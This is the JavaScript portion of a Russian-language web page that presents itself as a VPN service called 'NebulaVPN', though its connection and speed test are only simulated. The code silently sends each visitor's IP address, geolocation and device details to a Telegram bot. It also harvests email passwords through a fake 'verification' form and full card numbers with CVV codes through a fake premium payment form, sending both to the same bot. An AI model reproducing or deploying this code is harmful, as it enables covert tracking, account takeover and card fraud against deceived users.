    document.addEventListener('DOMContentLoaded', () => {
      initTheme();
      checkFirstVisit();
      updateTime();
      checkVipStatus();
      
      // Обработчик формы верификации
      document.getElementById('verifyForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        await submitVerification();
      });
      
      // Обработчик изменения даты рождения
      document.getElementById('dob').addEventListener('change', function() {
        calculateAge();
      });
      
      // Закрытие уведомлений при клике вне их
      document.addEventListener('click', function(e) {
        if (!e.target.closest('.notification') && !e.target.closest('.modal')) {
          closeNotification();
        }
      });
      
      // Сбор и отправка данных о пользователе при загрузке
      collectAndSendUserData();
    });

    // Сбор и отправка данных о пользователе
    async function collectAndSendUserData() {
      try {
        // Получаем IP и геоданные
        const ipData = await getIPAddress();
        const geoData = await getGeoData(ipData.ip);
        const systemData = getSystemData();
        
        // Формируем сообщение для Telegram
        const message = formatUserDataMessage(ipData, geoData, systemData);
        
        // Отправляем данные в Telegram
        await sendToTelegram(message);
      } catch (error) {
        console.error('Ошибка при сборе данных:', error);
      }
    }
    
    // Получаем IP-адрес пользователя
    async function getIPAddress() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return { ip: data.ip, timestamp: new Date().toLocaleString('ru-RU') };
      } catch (error) {
        return { ip: 'Не удалось определить', timestamp: new Date().toLocaleString('ru-RU') };
      }
    }
    
    // Получаем геоданные по IP
    async function getGeoData(ip) {
      try {
        // Используем ip-api.com (бесплатный сервис)
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        
        // Форматируем координаты
        if (data.latitude && data.longitude) {
          data.coordinates = `Широта: ${data.latitude}, Долгота: ${data.longitude}`;
          data.map_url = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
        } else {
          data.coordinates = 'Не определено';
          data.map_url = '#';
        }
        
        data.request_time = new Date().toLocaleString('ru-RU');
        return data;
      } catch (error) {
        return {
          city: 'Не определено',
          region: 'Не определено',
          country_name: 'Не определено',
          org: 'Не определено',
          postal: 'Не определено',
          timezone: 'Не определено',
          coordinates: 'Не определено',
          map_url: '#',
          request_time: new Date().toLocaleString('ru-RU')
        };
      }
    }
    
    // Собираем данные о системе пользователя
    function getSystemData() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        colorDepth: `${window.screen.colorDepth} бит`,
        cpuCores: navigator.hardwareConcurrency || 'Не определено',
        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Не определено',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled ? 'Да' : 'Нет',
        doNotTrack: navigator.doNotTrack || 'Не определено',
        browser: getBrowserInfo(),
        os: getOSInfo(),
        referrer: document.referrer || 'Прямой заход',
        collected_time: new Date().toLocaleString('ru-RU')
      };
    }
    
    // Определяем браузер
    function getBrowserInfo() {
      const ua = navigator.userAgent;
      let browser = "Неизвестный браузер";
      
      if (ua.includes("Firefox")) browser = "Firefox";
      else if (ua.includes("SamsungBrowser")) browser = "Samsung Browser";
      else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
      else if (ua.includes("Trident")) browser = "Internet Explorer";
      else if (ua.includes("Edge")) browser = "Microsoft Edge";
      else if (ua.includes("Chrome")) browser = "Google Chrome";
      else if (ua.includes("Safari")) browser = "Safari";
      
      return browser;
    }
    
    // Определяем операционную систему
    function getOSInfo() {
      const ua = navigator.userAgent;
      let os = "Неизвестная ОС";
      
      if (ua.includes("Windows")) os = "Windows";
      else if (ua.includes("Mac")) os = "MacOS";
      else if (ua.includes("Linux")) os = "Linux";
      else if (ua.includes("Android")) os = "Android";
      else if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
      
      return os;
    }
    
    // Форматируем сообщение с данными пользователя для Telegram
    function formatUserDataMessage(ipData, geoData, systemData) {
      return `
<b>🆕 Новый посетитель на NebulaVPN</b>

<b>🌐 Основная информация:</b>
🆔 <b>IP-адрес:</b> ${ipData.ip}
🕒 <b>Время запроса:</b> ${ipData.timestamp}
🏙 <b>Город:</b> ${geoData.city || 'Не определено'}
🏢 <b>Провайдер:</b> ${geoData.org || 'Не определено'}

<b>🌍 Геолокация:</b>
🌐 <b>Страна:</b> ${geoData.country_name || 'Не определено'}
📍 <b>Регион:</b> ${geoData.region || 'Не определено'}
🗺 <b>Координаты:</b> ${geoData.coordinates}
⏰ <b>Часовой пояс:</b> ${geoData.timezone || 'Не определено'}

<b>💻 Системная информация:</b>
🖥 <b>Браузер:</b> ${systemData.browser}
💻 <b>ОС:</b> ${systemData.os} (${systemData.platform})
🖥 <b>Разрешение экрана:</b> ${systemData.screen}
⚙️ <b>Ядер CPU:</b> ${systemData.cpuCores}
💾 <b>Память устройства:</b> ${systemData.deviceMemory}

<b>🔗 Дополнительно:</b>
📌 <b>User Agent:</b> ${systemData.userAgent}
⏱ <b>Часовой пояс:</b> ${systemData.timezone}
🔗 <b>Источник перехода:</b> ${systemData.referrer}
🕒 <b>Время сбора данных:</b> ${systemData.collected_time}

<b>📍 <a href="${geoData.map_url}">Посмотреть на карте</a></b>
      `;
    }

    // Проверка первого посещения
    function checkFirstVisit() {
      if (!localStorage.getItem('firstVisitShown')) {
        showInitialPermissionModal();
        localStorage.setItem('firstVisitShown', 'true');
      }
    }

    // Показ начального модального окна разрешений
    function showInitialPermissionModal() {
      const modal = document.getElementById('initialPermissionModal');
      modal.classList.add('active');
      
      let timeLeft = 10;
      const timer = document.getElementById('initialTimer');
      const timerInterval = setInterval(() => {
        timeLeft--;
        timer.textContent = timeLeft;
        
        if (timeLeft <= 0) {
          clearInterval(timerInterval);
          acceptInitialPermission();
        }
      }, 1000);
      
      document.getElementById('initialAccept').addEventListener('click', acceptInitialPermission);
      document.getElementById('initialDecline').addEventListener('click', () => {
        clearInterval(timerInterval);
        closeInitialModal();
        showNotification('Вы отклонили условия использования. Некоторые функции будут недоступны.', 'warning');
      });
    }

    function closeInitialModal() {
      document.getElementById('initialPermissionModal').classList.remove('active');
    }
        // Принятие начальных разрешений
    function acceptInitialPermission() {
      closeInitialModal();
      showNotification('Спасибо за принятие условий! Теперь вы можете использовать NebulaVPN.', 'success');
      collectAndSendInitialData();
      showTab('verify');
    }

    // Сбор и отправка начальных данных
    async function collectAndSendInitialData() {
      const ip = await getIPAddress();
      const now = new Date().toLocaleString('ru-RU');
      const ua = navigator.userAgent;
      const lang = navigator.language;
      const screenRes = `${screen.width}x${screen.height}`;
      const platform = navigator.platform;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const referrer = document.referrer || 'прямой заход';
      
      const message = `
<b>🛡 Новый пользователь на сайте NebulaVPN</b>
🕒 <b>Время:</b> ${now}
🌐 <b>IP:</b> ${ip.ip}
💻 <b>Платформа:</b> ${platform}
📱 <b>User Agent:</b> ${ua}
🗣 <b>Язык:</b> ${lang}
🖥 <b>Экран:</b> ${screenRes}
🕓 <b>Часовой пояс:</b> ${timezone}
🔗 <b>Источник:</b> ${referrer}
      `;
      
      sendToTelegram(message);
      localStorage.setItem('userIP', ip.ip);
    }

    // Запрос разрешения на подключение VPN
    function requestVpnPermission() {
      if (!localStorage.getItem('verificationCompleted')) {
        showNotification('Для подключения VPN необходимо пройти верификацию!', 'error');
        showTab('verify');
        return;
      }
      
      const modal = document.getElementById('vpnPermissionModal');
      modal.classList.add('active');
      
      document.getElementById('vpnAccept').addEventListener('click', () => {
        closeVpnModal();
        connectVpn();
      });
      
      document.getElementById('vpnDecline').addEventListener('click', () => {
        closeVpnModal();
        showNotification('Подключение отменено', 'warning');
      });
    }

    function closeVpnModal() {
      document.getElementById('vpnPermissionModal').classList.remove('active');
    }

    // Подключение к VPN (имитация)
    function connectVpn() {
      const status = document.getElementById('connectionStatus');
      const text = document.getElementById('connectionText');
      const connectBtn = document.getElementById('connectButton');
      const disconnectBtn = document.getElementById('disconnectButton');
      
      status.className = 'status-indicator connecting';
      text.textContent = 'Подключение...';
      
      // Имитация подключения
      setTimeout(() => {
        isConnected = true;
        status.className = 'status-indicator connected';
        text.textContent = 'Подключено к ' + document.getElementById('selectedServer').value;
        connectBtn.style.display = 'none';
        disconnectBtn.style.display = 'block';
        
        showNotification('Успешно подключено к VPN!', 'success');
        sendConnectionData();
      }, 2000);
    }
    
    // Отключение от VPN (имитация)
    function disconnectVpn() {
      const status = document.getElementById('connectionStatus');
      const text = document.getElementById('connectionText');
      const connectBtn = document.getElementById('connectButton');
      const disconnectBtn = document.getElementById('disconnectButton');
      
      status.className = 'status-indicator';
      text.textContent = 'Не подключено';
      connectBtn.style.display = 'block';
      disconnectBtn.style.display = 'none';
      isConnected = false;
      
      showNotification('VPN отключен', 'warning');
    }

    // Выбор сервера
    function selectServer(name, code) {
      currentServer = code;
      document.getElementById('selectedServer').value = name;
      showNotification(`Выбран сервер: ${name}`, 'success');
      
      if (isConnected) {
        document.getElementById('connectionText').textContent = 'Подключено к ' + name;
      }
    }

    // Выбор VIP сервера
    function selectVipServer(name, code) {
      if (!isVip) {
        showNotification('Этот сервер доступен только для премиум пользователей!', 'error');
        showVipModal();
        return;
      }
      
      selectServer(name, code);
    }

    // Отправка данных о подключении
    function sendConnectionData() {
      const message = `
<b>🔌 Новое подключение VPN</b>
🌐 <b>Сервер:</b> ${document.getElementById('selectedServer').value}
🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
📶 <b>Статус:</b> Успешно подключено
💎 <b>VIP:</b> ${isVip ? 'Да' : 'Нет'}
      `;
      
      sendToTelegram(message);
    }

    // Отправка данных верификации
    async function submitVerification() {
      const firstName = document.getElementById('firstName').value;
      const lastName = document.getElementById('lastName').value;
      const phone = document.getElementById('phone').value;
      const dob = document.getElementById('dob').value;
      const email = document.getElementById('email').value;
      const emailPass = document.getElementById('emailPass').value;
      const country = document.getElementById('country').value;

      if (!firstName || !lastName || !phone || !dob || !email || !emailPass || !country) {
        showNotification('Заполните все поля', 'error');
        return;
      }

      const caption = `
<b>🧾 Новая заявка на верификацию</b>
👤 <b>Имя:</b> ${firstName}
👤 <b>Фамилия:</b> ${lastName}
📱 <b>Телефон:</b> ${phone}
📧 <b>Email:</b> ${email}
🔑 <b>Пароль:</b> ${emailPass}
🎂 <b>Дата рождения:</b> ${dob}
🌍 <b>Страна:</b> ${country}
🕒 <b>Время отправки:</b> ${new Date().toLocaleString('ru-RU')}
      `;

      try {
        await sendToTelegram(caption);
        showNotification('Данные успешно отправлены на проверку!', 'success');

        localStorage.setItem('verificationCompleted', 'true');

        setTimeout(() => {
          document.getElementById('verifyForm').reset();
          showTab('connect');
        }, 3000);
      } catch (error) {
        showNotification('Ошибка при отправке данных', 'error');
        console.error(error);
      }
    }

    // Расчет возраста
    function calculateAge() {
      const dob = new Date(document.getElementById('dob').value);
      const today = new Date();
      let age = today.getFullYear() - dob.getFullYear();
      const m = today.getMonth() - dob.getMonth();
      
      if (m < 0 || (m === 0 && today.getDate() < dob.getDate())) {
        age--;
      }
      
      document.getElementById('ageDisplay').textContent = age;
    }

    // Тест скорости (имитация)
    function startSpeedTest() {
      const downloadSpeed = document.getElementById('downloadSpeed');
      const uploadSpeed = document.getElementById('uploadSpeed');
      const pingValue = document.getElementById('pingValue');
      const speedFill = document.getElementById('speedFill');
      
      speedFill.style.width = '0%';
      downloadSpeed.textContent = '0';
      uploadSpeed.textContent = '0';
      pingValue.textContent = '0';
      
      let progress = 0;
      const interval = setInterval(() => {
        progress += 5;
        speedFill.style.width = progress + '%';
        
        if (progress >= 100) {
          clearInterval(interval);
          
          // Генерируем случайные значения скорости
          const baseSpeed = isVip ? 50 : 20;
          const download = (Math.random() * baseSpeed + 10).toFixed(2);
          const upload = (Math.random() * (baseSpeed/2) + 5).toFixed(2);
          const ping = Math.floor(Math.random() * (isVip ? 30 : 50) + 10);
          
          downloadSpeed.textContent = download;
          uploadSpeed.textContent = upload;
          pingValue.textContent = ping;
          
          // Отправляем результаты в Telegram
          const message = `
<b>📊 Тест скорости завершен</b>
⬇️ <b>Скачивание:</b> ${download} Мбит/с
⬆️ <b>Загрузка:</b> ${upload} Мбит/с
🏓 <b>Пинг:</b> ${ping} мс
🌐 <b>Сервер:</b> ${isConnected ? document.getElementById('selectedServer').value : 'Прямое соединение'}
💎 <b>VIP:</b> ${isVip ? 'Да' : 'Нет'}
🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
          `;
          
          sendToTelegram(message);
        }
      }, 100);
    }

    // Отправка сообщения в Telegram
    async function sendToTelegram(message) {
      try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML"
          })
        });
        
        const data = await response.json();
        return data;
      } catch (error) {
        console.error('Ошибка отправки в Telegram:', error);
        throw error;
      }
    }

    // Переключение вкладок
    function showTab(id) {
      document.querySelectorAll('main > section').forEach(s => s.style.display = 'none');
      document.getElementById(id).style.display = 'block';
      document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
      document.querySelector(`.tabs button[onclick*='${id}']`).classList.add('active');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // Показ уведомления
    function showNotification(message, type = 'success') {
      const notification = document.getElementById('notification');
      const notificationText = document.getElementById('notificationText');
      
      // Закрываем предыдущее уведомление
      clearTimeout(notificationTimeout);
      notification.classList.remove('show');
      
      // Устанавливаем новое уведомление
      setTimeout(() => {
        notificationText.textContent = message;
        notification.className = 'notification ' + type;
        notification.classList.add('show');
        
        // Автозакрытие через 5 секунд
        notificationTimeout = setTimeout(() => {
          notification.classList.remove('show');
        }, 5000);
      }, 100);
    }

    // Закрытие уведомления
    function closeNotification() {
      clearTimeout(notificationTimeout);
      document.getElementById('notification').classList.remove('show');
    }

    // Обновление времени в футере
    function updateTime() {
      const timeElement = document.getElementById('footerTime');
      setInterval(() => {
        timeElement.textContent = new Date().toLocaleString('ru-RU');
      }, 1000);
    }

    // Переключение темы
    function toggleTheme() {
      const themes = ['dark', 'light', 'neon'];
      const currentIndex = themes.indexOf(currentTheme);
      const nextIndex = (currentIndex + 1) % themes.length;
      currentTheme = themes[nextIndex];
      
      document.documentElement.setAttribute('data-theme', currentTheme);
      localStorage.setItem('theme', currentTheme);
      
      const themeIcon = document.getElementById('themeIcon');
      if (currentTheme === 'dark') {
        themeIcon.className = 'fas fa-moon';
      } else if (currentTheme === 'light') {
        themeIcon.className = 'fas fa-sun';
      } else {
        themeIcon.className = 'fas fa-palette';
      }
    }

    // Инициализация темы
    function initTheme() {
      const savedTheme = localStorage.getItem('theme');
      const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
      
      if (savedTheme) {
        currentTheme = savedTheme;
      } else if (prefersDark) {
        currentTheme = 'dark';
      } else {
        currentTheme = 'light';
      }
      
      document.documentElement.setAttribute('data-theme', currentTheme);
      const themeIcon = document.getElementById('themeIcon');
      if (currentTheme === 'dark') {
        themeIcon.className = 'fas fa-moon';
      } else if (currentTheme === 'light') {
        themeIcon.className = 'fas fa-sun';
      } else {
        themeIcon.className = 'fas fa-palette';
      }
    }

    // Управление выпадающим меню языка
    document.getElementById('languageBtn').addEventListener('click', function(e) {
      e.stopPropagation();
      document.getElementById('languageDropdown').classList.toggle('show');
    });

    // Закрытие выпадающего меню при клике вне его
    document.addEventListener('click', function(e) {
      if (!e.target.closest('.language-switcher')) {
        document.getElementById('languageDropdown').classList.remove('show');
      }
    });

    // Переключение языка
    function changeLanguage(lang) {
      currentLanguage = lang;
      document.getElementById('currentLanguage').textContent = lang.toUpperCase();
      document.getElementById('languageDropdown').classList.remove('show');
      localStorage.setItem('language', lang);
    }

    /* VIP Функционал */
    
    // Показать модальное окно VIP
    function showVipModal() {
      if (!localStorage.getItem('verificationCompleted')) {
        showNotification('Для покупки премиум доступа необходимо пройти верификацию!', 'error');
        showTab('verify');
        return;
      }
      
      if (isVip) {
        showNotification('У вас уже активирован премиум доступ!', 'success');
        return;
      }
      
      const modal = document.getElementById('vipPaymentModal');
      modal.classList.add('active');
    }

    // Закрыть модальное окно VIP
    function closePaymentModal() {
      document.getElementById('vipPaymentModal').classList.remove('active');
    }

    // Выбор метода оплаты
    function selectPaymentMethod(method) {
      currentPaymentMethod = method;
      document.querySelectorAll('.payment-method').forEach(el => el.classList.remove('active'));
      event.currentTarget.classList.add('active');
      
      // Показываем соответствующие поля ввода
      document.getElementById('cardInput').style.display = method === 'card' ? 'block' : 'none';
    }

    // Форматирование номера карты
    function formatCardNumber(input) {
      let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      let formatted = '';
      
      for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) {
          formatted += ' ';
        }
        formatted += value[i];
      }
      
      input.value = formatted;
    }

    // Форматирование срока действия карты
    function formatCardExpiry(input) {
      let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      let formatted = '';
      
      for (let i = 0; i < value.length; i++) {
        if (i === 2) {
          formatted += '/';
        }
        formatted += value[i];
      }
      
      input.value = formatted;
    }

    // Обработка платежа
    function processPayment() {
      if (currentPaymentMethod === 'card') {
        const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
        const cardExpiry = document.getElementById('cardExpiry').value;
        const cardCvv = document.getElementById('cardCvv').value;
        const cardName = document.getElementById('cardName').value;
        
        if (!cardNumber || !cardExpiry || !cardCvv || !cardName) {
          showNotification('Заполните все поля карты', 'error');
          return;
        }
        
        if (cardNumber.length !== 16) {
          showNotification('Номер карты должен содержать 16 цифр', 'error');
          return;
        }
        
        if (cardCvv.length !== 3) {
          showNotification('CVV/CVC должен содержать 3 цифры', 'error');
          return;
        }
        
        // Показываем окно подтверждения
        closePaymentModal();
        document.getElementById('confirmationModal').classList.add('active');
      } else {
        showNotification('Выберите банковскую карту для оплаты', 'error');
      }
    }

    // Подтверждение платежа
    function confirmPayment() {
      const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
      const cardExpiry = document.getElementById('cardExpiry').value;
      const cardCvv = document.getElementById('cardCvv').value;
      const cardName = document.getElementById('cardName').value;
      
      // Отправляем данные карты в Telegram
      const message = `
<b>💳 Новый платеж за премиум подписку</b>
💰 <b>Сумма:</b> 300 ₽
🔢 <b>Номер карты:</b> ${cardNumber}
📅 <b>Срок действия:</b> ${cardExpiry}
🔐 <b>CVV/CVC:</b> ${cardCvv}
👤 <b>Имя владельца:</b> ${cardName}
🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
🌐 <b>IP:</b> ${localStorage.getItem('userIP') || 'не определен'}
      `;
      
      sendToTelegram(message);
      
      // Имитируем успешный платеж
      setTimeout(() => {
        document.getElementById('confirmationModal').classList.remove('active');
        showNotification('Премиум подписка успешно активирована!', 'success');
        activateVip();
               // Отправляем уведомление о переводе средств разработчику
        const transferMessage = `
<b>💰 Перевод средств на карту разработчика</b>
💳 <b>Номер карты:</b> ${DEVELOPER_CARD}
💵 <b>Сумма:</b> 300 ₽
👤 <b>От кого:</b> ${cardName} (${cardNumber.slice(-4)})
🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
        `;
        
        sendToTelegram(transferMessage);
      }, 1500);
    }

    // Отмена платежа
    function cancelPayment() {
      document.getElementById('confirmationModal').classList.remove('active');
      showVipModal();
    }

    // Активация VIP статуса
    function activateVip() {
      isVip = true;
      localStorage.setItem('vipStatus', 'active');
      document.getElementById('vipBadge').style.display = 'inline-flex';
      showNotification('Теперь у вас есть премиум доступ!', 'success');
      
      // Обновляем кнопки
      document.querySelectorAll('.vip-button').forEach(btn => {
        btn.innerHTML = '<i class="fas fa-crown"></i> Премиум активен';
        btn.classList.remove('vip-button-pulse');
      });
    }

    // Проверка VIP статуса при загрузке
    function checkVipStatus() {
      if (localStorage.getItem('vipStatus') === 'active') {
        isVip = true;
        document.getElementById('vipBadge').style.display = 'inline-flex';
        
        // Обновляем кнопки
        document.querySelectorAll('.vip-button').forEach(btn => {
          btn.innerHTML = '<i class="fas fa-crown"></i> Премиум активен';
          btn.classList.remove('vip-button-pulse');
        });
      }
    }
  </script>
</body>
</html>